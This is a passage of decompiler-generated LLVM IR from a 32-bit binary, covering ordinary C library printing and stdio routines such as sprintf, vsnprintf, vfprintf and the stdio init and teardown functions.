  %v1_805191c = add i32 %arg1, 128
  %v6_8051927 = icmp ugt i32 %v1_805191c, 383
  br i1 %v6_8051927, label %dec_label_pc_8051932, label %dec_label_pc_8051929

dec_label_pc_8051929:                             ; preds = %entry
  %v0_8051929 = load i32, i32* inttoptr (i32 134608420 to i32*), align 4
  %v2_805192e = mul i32 %arg1, 2
  %v3_805192e = add i32 %v0_8051929, %v2_805192e
  %v4_805192e = inttoptr i32 %v3_805192e to i16*
  %v5_805192e = load i16, i16* %v4_805192e, align 2
  %v6_805192e = sext i16 %v5_805192e to i32
  store i32 %v6_805192e, i32* @edx, align 4
  br label %dec_label_pc_8051932

dec_label_pc_8051932:                             ; preds = %entry, %dec_label_pc_8051929
  %v0_8051932 = phi i32 [ %arg1, %entry ], [ %v6_805192e, %dec_label_pc_8051929 ]
  ret i32 %v0_8051932

; uselistorder directives
  uselistorder label %dec_label_pc_8051932, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8065b20.920 to i32)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %v2_8051963 = ptrtoint i32* %stack_var_16 to i32
  %v4_8051978 = inttoptr i32 %arg1 to i8*
  %v5_8051978 = call i32 @__GI_vsnprintf(i8* %v4_8051978, i32 %arg2, i32 %arg3, i32 %v2_8051963)
  ret i32 %v5_8051978
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_8051987 = ptrtoint i32* %stack_var_12 to i32
  %v4_805199a = inttoptr i32 %arg1 to i8*
  %v5_805199a = call i32 @__GI_vsnprintf(i8* %v4_805199a, i32 -1, i32 %arg2, i32 %v2_8051987)
  ret i32 %v5_805199a

; uselistorder directives
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_vsnprintf, { 1, 0 }
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80519a4 = load i32, i32* @ebp, align 4
  %v0_80519a5 = load i32, i32* @edi, align 4
  %v0_80519a6 = load i32, i32* @esi, align 4
  %v0_80519a7 = load i32, i32* @ebx, align 4
  store i32 %v0_80519a7, i32* %stack_var_-16, align 4
  %v4_80519ab = ptrtoint i8* %arg1 to i32
  store i32 %v4_80519ab, i32* @esi, align 4
  %v2_80519af = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_80519e0 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_80519e0, i32* @ebp, align 4
  %v1_80519e4 = sub i32 -1, %v4_80519ab
  store i32 %v1_80519e4, i32* @ebx, align 4
  %v1_80519e7 = call i32 @__stdio_init_mutex(i32 %v2_80519af)
  %v0_80519f7 = load i32, i32* @ebx, align 4
  %v1_80519f7 = load i32, i32* @edi, align 4
  %tmp33 = icmp ugt i32 %v0_80519f7, %v1_80519f7
  br i1 %tmp33, label %dec_label_pc_80519fb, label %dec_label_pc_80519fd

dec_label_pc_80519fb:                             ; preds = %entry
  store i32 %v1_80519f7, i32* @ebx, align 4
  br label %dec_label_pc_80519fd

dec_label_pc_80519fd:                             ; preds = %entry, %dec_label_pc_80519fb
  %v1_80519fd = phi i32 [ %v0_80519f7, %entry ], [ %v1_80519f7, %dec_label_pc_80519fb ]
  %v0_80519fd = load i32, i32* @esi, align 4
  %v2_80519fd = add i32 %v0_80519fd, %v1_80519fd
  %v4_8051a28 = inttoptr i32 %arg3 to i8*
  %v5_8051a28 = call i32 @_vfprintf_internal(i32 %v2_80519e0, i8* %v4_8051a28, i32 %arg4, i32 %v2_80519fd)
  store i32 %v5_8051a28, i32* @edx, align 4
  %v0_8051a32 = load i32, i32* @ebx, align 4
  %v1_8051a32 = icmp eq i32 %v0_8051a32, 0
  br i1 %v1_8051a32, label %dec_label_pc_8051a4c, label %dec_label_pc_8051a36

dec_label_pc_8051a36:                             ; preds = %dec_label_pc_80519fd
  %v16_8051a3a = icmp eq i32 %v1_80519fd, 0
  %v1_8051a3e = icmp eq i1 %v16_8051a3a, false
  br i1 %v1_8051a3e, label %dec_label_pc_8051a45, label %dec_label_pc_8051a40

dec_label_pc_8051a40:                             ; preds = %dec_label_pc_8051a36
  %v1_8051a40 = add i32 %v2_80519fd, -1
  br label %dec_label_pc_8051a45

dec_label_pc_8051a45:                             ; preds = %dec_label_pc_8051a36, %dec_label_pc_8051a40
  %stack_var_-80.0.in = phi i32 [ %v0_80519fd, %dec_label_pc_8051a36 ], [ %v1_8051a40, %dec_label_pc_8051a40 ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_8051a4f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051a4c

dec_label_pc_8051a4c:                             ; preds = %dec_label_pc_80519fd, %dec_label_pc_8051a45
  %v0_8051a4f = phi i32 [ %v5_8051a28, %dec_label_pc_80519fd ], [ %v0_8051a4f.pre, %dec_label_pc_8051a45 ]
  %v2_8051a51 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051a51, i32* @ebx, align 4
  store i32 %v0_80519a6, i32* @esi, align 4
  store i32 %v0_80519a5, i32* @edi, align 4
  store i32 %v0_80519a4, i32* @ebp, align 4
  ret i32 %v0_8051a4f

; uselistorder directives
  uselistorder i32 %v0_80519fd, { 1, 0 }
  uselistorder i32 %v1_80519fd, { 1, 0 }
  uselistorder i32 %v1_80519f7, { 1, 2, 0 }
  uselistorder i32 %v0_80519f7, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_8051a4c, { 1, 0 }
  uselistorder label %dec_label_pc_8051a45, { 1, 0 }
  uselistorder label %dec_label_pc_80519fd, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051a59 = load i32, i32* @edi, align 4
  %v0_8051a5a = load i32, i32* @esi, align 4
  %v0_8051a5b = load i32, i32* @ebx, align 4
  store i32 %v0_8051a5b, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8051a64 = call i32 @__errno_location(i32 %v0_8051a5b)
  store i32 %v1_8051a64, i32* @edi, align 4
  %v0_8051a6e = load i32, i32* @global_var_805f680.917, align 128
  store i32 %v0_8051a6e, i32* @esi, align 4
  %v1_8051a74 = inttoptr i32 %v1_8051a64 to i32*
  %v2_8051a74 = load i32, i32* %v1_8051a74, align 4
  store i32 %v2_8051a74, i32* %ebp.global-to-local, align 4
  %v1_8051a78 = call i32 @isatty(i32 0)
  %v0_8051a7d = load i32, i32* @ebx, align 4
  %v2_8051a7f = sub i32 %v0_8051a7d, %v1_8051a78
  %v2_8051a8a = mul i32 %v2_8051a7f, 256
  %v0_8051a8d = load i32, i32* @esi, align 4
  %v2_8051a8d = xor i32 %v0_8051a8d, %v2_8051a8a
  %v1_8051a8f = trunc i32 %v2_8051a8d to i16
  store i16 %v1_8051a8f, i16* bitcast (i32* @global_var_805f680.917 to i16*), align 128
  %v0_8051a96 = load i32, i32* @global_var_805f6d0.918, align 16
  store i32 %v0_8051a96, i32* @esi, align 4
  %v1_8051a9c = call i32 @isatty(i32 1)
  %v0_8051aa1 = load i32, i32* @ebx, align 4
  %v2_8051aa1 = sub i32 %v0_8051aa1, %v1_8051a9c
  %v2_8051aa3 = mul i32 %v2_8051aa1, 256
  %v0_8051aa6 = load i32, i32* @esi, align 4
  %v2_8051aa6 = xor i32 %v2_8051aa3, %v0_8051aa6
  %v1_8051aa8 = trunc i32 %v2_8051aa6 to i16
  store i16 %v1_8051aa8, i16* bitcast (i32* @global_var_805f6d0.918 to i16*), align 16
  %v0_8051aaf = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051aaf = load i32, i32* @edi, align 4
  %v2_8051aaf = inttoptr i32 %v1_8051aaf to i32*
  store i32 %v0_8051aaf, i32* %v2_8051aaf, align 4
  %v2_8051ab4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051ab4, i32* @ebx, align 4
  store i32 %v0_8051a5a, i32* @esi, align 4
  store i32 %v0_8051a59, i32* @edi, align 4
  ret i32 %v1_8051a9c

; uselistorder directives
  uselistorder i32 %v1_8051a64, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8051ac7 = inttoptr i32 %arg1 to i16*
  %v4_8051ac7 = call i32 @memcpy(i16* %v3_8051ac7, i32 ptrtoint (i32* @global_var_805cfe0.921 to i32), i32 24)
  ret i32 %v4_8051ac7
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ad0 = load i32, i32* @esi, align 4
  %v0_8051ad1 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ad1, i32* %stack_var_-8, align 4
  %v1_8051ada = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805f640.922 to i32))
  store i32 %v1_8051ada, i32* %eax.global-to-local, align 4
  %v1_8051ae6 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805f658.923 to i32))
  store i32 %v1_8051ae6, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805f63c.924 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_8051b3022 = icmp eq i32 %storemerge21, 0
  %v1_8051b3223 = icmp eq i1 %v1_8051b3022, false
  br i1 %v1_8051b3223, label %dec_label_pc_8051af3.lr.ph, label %dec_label_pc_8051b50.preheader

dec_label_pc_8051af3.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8051af3

dec_label_pc_8051af3:                             ; preds = %dec_label_pc_8051af3.lr.ph, %dec_label_pc_8051b1a
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_8051af3.lr.ph ], [ %storemerge, %dec_label_pc_8051b1a ]
  %v1_8051af6 = add i32 %storemerge24, 56
  store i32 %v1_8051af6, i32* @esi, align 4
  %v1_8051afa = call i32 @__pthread_return_0(i32 %v1_8051af6)
  store i32 %v1_8051afa, i32* %eax.global-to-local, align 4
  %v1_8051b02 = icmp eq i32 %v1_8051afa, 0
  br i1 %v1_8051b02, label %dec_label_pc_8051b1a, label %dec_label_pc_8051b06

dec_label_pc_8051b06:                             ; preds = %dec_label_pc_8051af3
  %v0_8051b06 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b06 = add i32 %v0_8051b06, 8
  %v2_8051b06 = inttoptr i32 %v1_8051b06 to i32*
  %v3_8051b06 = load i32, i32* %v2_8051b06, align 4
  store i32 %v3_8051b06, i32* %eax.global-to-local, align 4
  %v1_8051b09 = inttoptr i32 %v0_8051b06 to i16*
  store i16 48, i16* %v1_8051b09, align 2
  %v0_8051b0e = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b0e = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051b0e = add i32 %v1_8051b0e, 24
  %v3_8051b0e = inttoptr i32 %v2_8051b0e to i32*
  store i32 %v0_8051b0e, i32* %v3_8051b0e, align 4
  %v0_8051b11 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b11 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051b11 = add i32 %v1_8051b11, 28
  %v3_8051b11 = inttoptr i32 %v2_8051b11 to i32*
  store i32 %v0_8051b11, i32* %v3_8051b11, align 4
  %v0_8051b14 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b14 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051b14 = add i32 %v1_8051b14, 16
  %v3_8051b14 = inttoptr i32 %v2_8051b14 to i32*
  store i32 %v0_8051b14, i32* %v3_8051b14, align 4
  %v0_8051b17 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b17 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051b17 = add i32 %v1_8051b17, 20
  %v3_8051b17 = inttoptr i32 %v2_8051b17 to i32*
  store i32 %v0_8051b17, i32* %v3_8051b17, align 4
  br label %dec_label_pc_8051b1a

dec_label_pc_8051b1a:                             ; preds = %dec_label_pc_8051af3, %dec_label_pc_8051b06
  %v0_8051b1d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b1d = add i32 %v0_8051b1d, 52
  %v2_8051b1d = inttoptr i32 %v1_8051b1d to i32*
  store i32 1, i32* %v2_8051b1d, align 4
  %v0_8051b24 = load i32, i32* @esi, align 4
  %v1_8051b25 = call i32 @__stdio_init_mutex(i32 %v0_8051b24)
  store i32 %v1_8051b25, i32* %eax.global-to-local, align 4
  %v0_8051b2a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b2a = add i32 %v0_8051b2a, 32
  %v2_8051b2a = inttoptr i32 %v1_8051b2a to i32*
  %storemerge = load i32, i32* %v2_8051b2a, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_8051b30 = icmp eq i32 %storemerge, 0
  %v1_8051b32 = icmp eq i1 %v1_8051b30, false
  br i1 %v1_8051b32, label %dec_label_pc_8051af3, label %dec_label_pc_8051b2d.dec_label_pc_8051b50.preheader_crit_edge

dec_label_pc_8051b2d.dec_label_pc_8051b50.preheader_crit_edge: ; preds = %dec_label_pc_8051b1a
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805f63c.924 to i32*), align 4
  br label %dec_label_pc_8051b50.preheader

dec_label_pc_8051b50.preheader:                   ; preds = %dec_label_pc_8051b2d.dec_label_pc_8051b50.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_8051b2d.dec_label_pc_8051b50.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_8051b503 = icmp eq i32 %storemerge12, 0
  %v1_8051b5210 = icmp eq i1 %v1_8051b503, false
  br i1 %v1_8051b5210, label %dec_label_pc_8051b3c.preheader, label %dec_label_pc_8051b54

dec_label_pc_8051b3c.preheader:                   ; preds = %dec_label_pc_8051b50.preheader
  br label %dec_label_pc_8051b3c

dec_label_pc_8051b3c:                             ; preds = %dec_label_pc_8051b3c.preheader, %dec_label_pc_8051b4d
  %v0_8051b44 = phi i32 [ %storemerge1, %dec_label_pc_8051b4d ], [ %storemerge12, %dec_label_pc_8051b3c.preheader ]
  %v1_8051b3c = inttoptr i32 %v0_8051b44 to i8*
  %v2_8051b3c = load i8, i8* %v1_8051b3c, align 1
  %v3_8051b3c = and i8 %v2_8051b3c, 64
  %v4_8051b3c = icmp eq i8 %v3_8051b3c, 0
  br i1 %v4_8051b3c, label %dec_label_pc_8051b4d, label %dec_label_pc_8051b41

dec_label_pc_8051b41:                             ; preds = %dec_label_pc_8051b3c
  %v1_8051b45 = call i32 @__stdio_wcommit(i32 %v0_8051b44)
  store i32 %v1_8051b45, i32* %eax.global-to-local, align 4
  %v0_8051b4d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b4d

dec_label_pc_8051b4d:                             ; preds = %dec_label_pc_8051b3c, %dec_label_pc_8051b41
  %v0_8051b4d = phi i32 [ %v0_8051b44, %dec_label_pc_8051b3c ], [ %v0_8051b4d.pre, %dec_label_pc_8051b41 ]
  %v1_8051b4d = add i32 %v0_8051b4d, 32
  %v2_8051b4d = inttoptr i32 %v1_8051b4d to i32*
  %storemerge1 = load i32, i32* %v2_8051b4d, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_8051b50 = icmp eq i32 %storemerge1, 0
  %v1_8051b52 = icmp eq i1 %v1_8051b50, false
  br i1 %v1_8051b52, label %dec_label_pc_8051b3c, label %dec_label_pc_8051b54

dec_label_pc_8051b54:                             ; preds = %dec_label_pc_8051b4d, %dec_label_pc_8051b50.preheader
  %v2_8051b54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b54, i32* %eax.global-to-local, align 4
  %v2_8051b55 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051b55, i32* @ebx, align 4
  store i32 %v0_8051ad0, i32* @esi, align 4
  ret i32 %v2_8051b54

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051b4d, { 1, 0 }
  uselistorder label %dec_label_pc_8051b3c, { 1, 0 }
  uselistorder label %dec_label_pc_8051b1a, { 1, 0 }
  uselistorder label %dec_label_pc_8051af3, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_8051b58 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051b60 = add i32 %arg1, 8
  %v2_8051b60 = inttoptr i32 %v1_8051b60 to i32*
  %v3_8051b60 = load i32, i32* %v2_8051b60, align 4
  store i32 %v3_8051b60, i32* %edx.global-to-local, align 4
  %v1_8051b63 = add i32 %arg1, 16
  %v2_8051b63 = inttoptr i32 %v1_8051b63 to i32*
  %v3_8051b63 = load i32, i32* %v2_8051b63, align 4
  %v2_8051b66 = sub i32 %v3_8051b63, %v3_8051b60
  %v12_8051b66 = icmp eq i32 %v2_8051b66, 0
  store i32 %v2_8051b66, i32* %eax.global-to-local, align 4
  br i1 %v12_8051b66, label %dec_label_pc_8051b79, label %dec_label_pc_8051b6a

dec_label_pc_8051b6a:                             ; preds = %entry
  store i32 %v3_8051b60, i32* %v2_8051b63, align 4
  %v0_8051b6d = load i32, i32* @ecx, align 4
  %v0_8051b6e = load i32, i32* %eax.global-to-local, align 4
  %v0_8051b6f = load i32, i32* %edx.global-to-local, align 4
  %v0_8051b70 = load i32, i32* @ebx, align 4
  %v4_8051b71 = inttoptr i32 %v0_8051b70 to i16*
  %v5_8051b71 = call i32 @__stdio_WRITE(i16* %v4_8051b71, i32 %v0_8051b6f, i32 %v0_8051b6e, i32 %v0_8051b6d)
  store i32 %v5_8051b71, i32* %eax.global-to-local, align 4
  %v0_8051b79.pre = load i32, i32* @ebx, align 4
  %v2_8051b7f.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8051b79

dec_label_pc_8051b79:                             ; preds = %entry, %dec_label_pc_8051b6a
  %v2_8051b7f = phi i32 [ %tmp11, %entry ], [ %v2_8051b7f.pre, %dec_label_pc_8051b6a ]
  %v0_8051b79 = phi i32 [ %arg1, %entry ], [ %v0_8051b79.pre, %dec_label_pc_8051b6a ]
  %v1_8051b79 = add i32 %v0_8051b79, 16
  %v2_8051b79 = inttoptr i32 %v1_8051b79 to i32*
  %v3_8051b79 = load i32, i32* %v2_8051b79, align 4
  store i32 %v3_8051b79, i32* %eax.global-to-local, align 4
  %v2_8051b7c = add i32 %v0_8051b79, 8
  %v3_8051b7c = inttoptr i32 %v2_8051b7c to i32*
  %v4_8051b7c = load i32, i32* %v3_8051b7c, align 4
  %v5_8051b7c = sub i32 %v3_8051b79, %v4_8051b7c
  store i32 %v5_8051b7c, i32* %eax.global-to-local, align 4
  store i32 %v2_8051b7f, i32* @edx, align 4
  store i32 %v0_8051b58, i32* @ebx, align 4
  ret i32 %v5_8051b7c

; uselistorder directives
  uselistorder i32 %v0_8051b79, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051b79, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v12_8051b87 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8051b8a = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051b8a, i32* @esi, align 4
  %v1_8051b8e = add i32 %v4_8051b8a, 52
  %v2_8051b8e = inttoptr i32 %v1_8051b8e to i32*
  %v3_8051b8e = load i32, i32* %v2_8051b8e, align 4
  store i32 %v3_8051b8e, i32* @edi, align 4
  %v1_8051b91 = icmp eq i32 %v3_8051b8e, 0
  %v1_8051b93 = icmp eq i1 %v1_8051b91, false
  br i1 %v1_8051b93, label %dec_label_pc_8051bb4, label %dec_label_pc_8051b95

dec_label_pc_8051b95:                             ; preds = %entry
  %v1_8051b95 = add i32 %v4_8051b8a, 56
  store i32 %v1_8051b95, i32* @ebx, align 4
  store i32 %v12_8051b87, i32* @eax, align 4
  %v3_8051ba4 = call i32 @__pthread_return_void(i32 %v12_8051b87, i32 134564427)
  %v0_8051ba9 = load i32, i32* @ebx, align 4
  %v2_8051bac = call i32 @__pthread_return_0(i32 %v0_8051ba9)
  %v0_8051bb4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051bb4

dec_label_pc_8051bb4:                             ; preds = %entry, %dec_label_pc_8051b95
  %v0_8051bca = phi i32 [ %v4_8051b8a, %entry ], [ %v0_8051bb4.pre, %dec_label_pc_8051b95 ]
  %v1_8051bb4 = inttoptr i32 %v0_8051bca to i16*
  %v2_8051bb4 = load i16, i16* %v1_8051bb4, align 2
  %v1_8051bb7 = and i16 %v2_8051bb4, 192
  %v6_8051bbc = icmp eq i16 %v1_8051bb7, 192
  br i1 %v6_8051bbc, label %dec_label_pc_8051bb4.dec_label_pc_8051bda_crit_edge, label %dec_label_pc_8051bc3

dec_label_pc_8051bb4.dec_label_pc_8051bda_crit_edge: ; preds = %dec_label_pc_8051bb4
  br label %dec_label_pc_8051bda

dec_label_pc_8051bc3:                             ; preds = %dec_label_pc_8051bb4
  %v0_8051bc3 = load i32, i32* @ecx, align 4
  %v6_8051bcb = call i32 @__stdio_trans2w_o(i16* %v1_8051bb4, i32 128, i32 %v0_8051bc3, i32 %v0_8051bc3)
  store i32 -1, i32* @ebx, align 4
  %v1_8051bd6 = icmp eq i32 %v6_8051bcb, 0
  %v1_8051bd8 = icmp eq i1 %v1_8051bd6, false
  br i1 %v1_8051bd8, label %dec_label_pc_8051bee, label %dec_label_pc_8051bc3.dec_label_pc_8051bda_crit_edge

dec_label_pc_8051bc3.dec_label_pc_8051bda_crit_edge: ; preds = %dec_label_pc_8051bc3
  %v0_8051be3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051bda

dec_label_pc_8051bda:                             ; preds = %dec_label_pc_8051bb4.dec_label_pc_8051bda_crit_edge, %dec_label_pc_8051bc3.dec_label_pc_8051bda_crit_edge
  %v0_8051be3 = phi i32 [ %v0_8051bca, %dec_label_pc_8051bb4.dec_label_pc_8051bda_crit_edge ], [ %v0_8051be3.pre, %dec_label_pc_8051bc3.dec_label_pc_8051bda_crit_edge ]
  %v0_8051bda = load i32, i32* @edx, align 4
  %v5_8051be4 = inttoptr i32 %arg2 to i8*
  %v6_8051be4 = call i32 @_vfprintf_internal(i32 %v0_8051be3, i8* %v5_8051be4, i32 %arg3, i32 %v0_8051bda)
  store i32 %v6_8051be4, i32* @ebx, align 4
  br label %dec_label_pc_8051bee

dec_label_pc_8051bee:                             ; preds = %dec_label_pc_8051bc3, %dec_label_pc_8051bda
  %v0_8051c067 = phi i32 [ -1, %dec_label_pc_8051bc3 ], [ %v6_8051be4, %dec_label_pc_8051bda ]
  br i1 %v1_8051b93, label %dec_label_pc_8051c03, label %dec_label_pc_8051bf2

dec_label_pc_8051bf2:                             ; preds = %dec_label_pc_8051bee
  store i32 %v12_8051b87, i32* @eax, align 4
  %v3_8051bfb = call i32 @__pthread_return_void(i32 %v12_8051b87, i32 1)
  %v0_8051c06.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051c03

dec_label_pc_8051c03:                             ; preds = %dec_label_pc_8051bee, %dec_label_pc_8051bf2
  %v0_8051c06 = phi i32 [ %v0_8051c067, %dec_label_pc_8051bee ], [ %v0_8051c06.pre, %dec_label_pc_8051bf2 ]
  ret i32 %v0_8051c06

; uselistorder directives
  uselistorder i32 %v12_8051b87, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_8051c03, { 1, 0 }
  uselistorder label %dec_label_pc_8051bee, { 1, 0 }
  uselistorder label %dec_label_pc_8051bda, { 1, 0 }
  uselistorder label %dec_label_pc_8051bb4, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_8051c0c = load i32, i32* @edi, align 4
  %v0_8051c0d = load i32, i32* @esi, align 4
  %v0_8051c0e = load i32, i32* @ebx, align 4
  %v0_8051c0f = load i32, i32* @eax, align 4
  store i32 %v0_8051c0f, i32* @edi, align 4
  %v0_8051c14 = load i32, i32* @ecx, align 4
  store i32 %v0_8051c14, i32* @esi, align 4
  store i32 %v0_8051c14, i32* @ebx, align 4
  %v0_8051c18 = load i32, i32* @edx, align 4
  store i32 %v0_8051c18, i32* %stack_var_-13, align 4
  %v1_8051c1f2 = icmp eq i32 %v0_8051c14, 0
  br i1 %v1_8051c1f2, label %dec_label_pc_8051c37, label %dec_label_pc_8051c23.lr.ph

dec_label_pc_8051c23.lr.ph:                       ; preds = %entry
  %v2_8051c23 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_8051c23

dec_label_pc_8051c1e:                             ; preds = %dec_label_pc_8051c23
  %v1_8051c1e = add i32 %v0_8051c1e, -1
  %v8_8051c1e = icmp eq i32 %v1_8051c1e, 0
  store i32 %v1_8051c1e, i32* @ebx, align 4
  br i1 %v8_8051c1e, label %dec_label_pc_8051c37.loopexit, label %dec_label_pc_8051c1e.dec_label_pc_8051c23_crit_edge

dec_label_pc_8051c1e.dec_label_pc_8051c23_crit_edge: ; preds = %dec_label_pc_8051c1e
  %v0_8051c27.pre = load i32, i32* @edx, align 4
  %v0_8051c28.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051c23

dec_label_pc_8051c23:                             ; preds = %dec_label_pc_8051c1e.dec_label_pc_8051c23_crit_edge, %dec_label_pc_8051c23.lr.ph
  %v0_8051c28 = phi i32 [ %v0_8051c28.pre, %dec_label_pc_8051c1e.dec_label_pc_8051c23_crit_edge ], [ %v0_8051c0f, %dec_label_pc_8051c23.lr.ph ]
  %v0_8051c27 = phi i32 [ %v0_8051c27.pre, %dec_label_pc_8051c1e.dec_label_pc_8051c23_crit_edge ], [ %v0_8051c18, %dec_label_pc_8051c23.lr.ph ]
  %v4_8051c2c = call i32 @__stdio_fwrite(i32 %v2_8051c23, i32 1, i32 %v0_8051c28, i32 %v0_8051c27)
  %v8_8051c34 = icmp eq i32 %v4_8051c2c, 1
  %v0_8051c1e = load i32, i32* @ebx, align 4
  br i1 %v8_8051c34, label %dec_label_pc_8051c1e, label %dec_label_pc_8051c37.loopexit

dec_label_pc_8051c37.loopexit:                    ; preds = %dec_label_pc_8051c1e, %dec_label_pc_8051c23
  %v1_8051c37.ph = phi i32 [ %v0_8051c1e, %dec_label_pc_8051c23 ], [ 0, %dec_label_pc_8051c1e ]
  %v0_8051c37.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051c37

dec_label_pc_8051c37:                             ; preds = %dec_label_pc_8051c37.loopexit, %entry
  %v0_8051c37 = phi i32 [ 0, %entry ], [ %v0_8051c37.pre, %dec_label_pc_8051c37.loopexit ]
  %v1_8051c37 = phi i32 [ 0, %entry ], [ %v1_8051c37.ph, %dec_label_pc_8051c37.loopexit ]
  %v2_8051c37 = sub i32 %v0_8051c37, %v1_8051c37
  store i32 %v0_8051c0e, i32* @ebx, align 4
  store i32 %v0_8051c0d, i32* @esi, align 4
  store i32 %v0_8051c0c, i32* @edi, align 4
  ret i32 %v2_8051c37

; uselistorder directives
  uselistorder i32 %v1_8051c1e, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_8051c37.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_8051c55 = trunc i32 %arg2 to i8
  %v5_8051c55 = icmp slt i8 %v3_8051c55, 0
  %v1_8051c57 = icmp eq i1 %v5_8051c55, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_8051c57, label %dec_label_pc_8051c88, label %dec_label_pc_8051c59

dec_label_pc_8051c59:                             ; preds = %entry
  %v3_8051c60 = call i32 @strlen(i8* %arg4)
  %v0_8051c68 = load i32, i32* @ebx, align 4
  %v2_8051c68 = sub i32 %v0_8051c68, %v3_8051c60
  store i32 %v2_8051c68, i32* @ebx, align 4
  store i32 %v3_8051c60, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_8051c68, 1
  br i1 %tmp23, label %dec_label_pc_8051c86, label %dec_label_pc_8051c70

dec_label_pc_8051c70:                             ; preds = %dec_label_pc_8051c59
